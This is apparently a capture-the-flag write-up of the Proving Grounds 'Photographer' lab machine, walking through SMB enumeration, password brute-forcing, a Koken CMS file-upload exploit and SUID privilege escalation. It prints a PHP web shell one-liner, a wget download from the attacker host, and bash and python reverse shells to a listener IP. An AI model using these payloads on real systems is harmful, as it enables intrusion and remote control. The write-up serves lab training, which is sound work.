# Offsec: Photography
***Overview**: Photographer is a Linux machine on Offensive Security Proving grounds that exploits a file upload vulnerability in Koken CMS 0.22.24 to Remote code execution vulnerability to gain foothold and then elevates privileges to root with a SUID binary.*

#### Scanning and Enumeration
- I start by looking through the site
![](Photographer_assets/Pasted%20image%2020221025185148.png)
- then I proceed to scan for open ports using nmap
![](Photographer_assets/Pasted%20image%2020221025162922.png)
![](Photographer_assets/Pasted%20image%2020221025162937.png)
- seeing SMB is open, i try listing the shares
![](Photographer_assets/Pasted%20image%2020221025161500.png)
- then I see that i have access to the sambashare share, accessing it, I can see that it has two files 
![](Photographer_assets/Pasted%20image%2020221025161606.png)
- viewing the mailsent.txt, i get a mail so i save it for later use
![](Photographer_assets/Pasted%20image%2020221025161811.png)
- I also extracted the wordpress zip file, although i didn't see anything useful in it
![](Photographer_assets/Pasted%20image%2020221025161853.png)
- I first do a directory scan on the site but i didn't find useful directories
![](Photographer_assets/Pasted%20image%2020221025162314.png)
- from the nmap scan i an see that a web server is also open on port 8000, so i run a directory scan on that port as well 
![](Photographer_assets/Pasted%20image%2020221025163007.png)
- going to port 8000, i am displayed with another it entirely
![](Photographer_assets/Pasted%20image%2020221025162240.png)
- inspecting the page, i saw the CMS running is Koken CMS 0.22.24, which is also verified using wappalyzer
![](Photographer_assets/Pasted%20image%2020221025163940.png)
- looking for exploits on that particular CMS, i see one on ExploitDB at [https://www.exploit-db.com/exploits/48706](https://www.exploit-db.com/exploits/48706)
![](Photographer_assets/Pasted%20image%2020221025164309.png)
#### Exploitation
- looking through it i can see that this exploit requires authentication to before it can be exploited, so checking google on how to access a koken sites login page, i saw that it is located at the /admin directory
![](Photographer_assets/Pasted%20image%2020221025164245.png)
- the login page requires an email and a password to login, looking at the file we retrieved i was able to get the email as daisa@photographer.com and I also got a clue on the password 
![](Photographer_assets/Pasted%20image%2020221025190339.png)
from this clue and also bruteforcing with burp i got the password as babygirl
![](Photographer_assets/Pasted%20image%2020221025170151.png)
- so logging in with the credentials gotten, I was able to access the dashboard
![](Photographer_assets/Pasted%20image%2020221025170117.png)
- so following the exploit at exploitdb, I will upload a script that will enable remote code execution exploiting the file upload vulnerability.
![](Photographer_assets/Pasted%20image%2020221025170401.png)
- I created a script image.php.jpg with the content `<?php system($_GET['cmd']);?>
![](Photographer_assets/Pasted%20image%2020221025170418.png)
- while uploading it, i intercepted the request to burp, so i can change the file name
![](Photographer_assets/Pasted%20image%2020221025170801.png)
- I edited the filename to image.php
![](Photographer_assets/Pasted%20image%2020221025171010.png)
- forwarding the modified request, i verify that the script has be uploaded by hovering my mouse on the Download file button and getting the link to the file as  http://192.168.53.76:8000/storage/originals/f1/f2/image.php
![](Photographer_assets/Pasted%20image%2020221025171133.png)
- so going to the link and specifying the command to run http://192.168.53.76:8000/storage/originals/f1/f2/image.php?cmd=whoami
![](Photographer_assets/Pasted%20image%2020221025173555.png)
#### Foothold
- So now I want to get foothold on the machine, so i create a reverse shell script with the content `sh -i >& /dev/tcp/192.168.49.53/9999 0>&1`
- then I spin up a python server on my machine and then pass the following command to the `cmd` parameter to get it on the machine `wget http://192.168.49.53/script.sh`
- I change the permissions of the file using the command `chmod 777 script.sh` to make it executable, then i execute it while waiting on my netcat listener by running `./script.sh`
- I then check if python is running on the system so i can attempt to get a reverse shell and i see that it is.
![](Photographer_assets/Pasted%20image%2020221025184358.png)
- I create another script with the payload below and get it on the machine
`export RHOST="192.168.49.53";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`
- executing the file , while listening with netcat, I then got a shell
![](Photographer_assets/Pasted%20image%2020221025183523.png)
- looking through, i got the first flag
![](Photographer_assets/Pasted%20image%2020221025183614.png)
#### Privilege Escalation
- I then search for SUID files, and find that the php binary 
![](Photographer_assets/Pasted%20image%2020221025183917.png)
- looking through GTFObins, I got a way to elevate privileges
![](Photographer_assets/Pasted%20image%2020221025184201.png)
- Running the command I was able to get root access and get the second flag from the root directory
![](Photographer_assets/Pasted%20image%2020221025184141.png)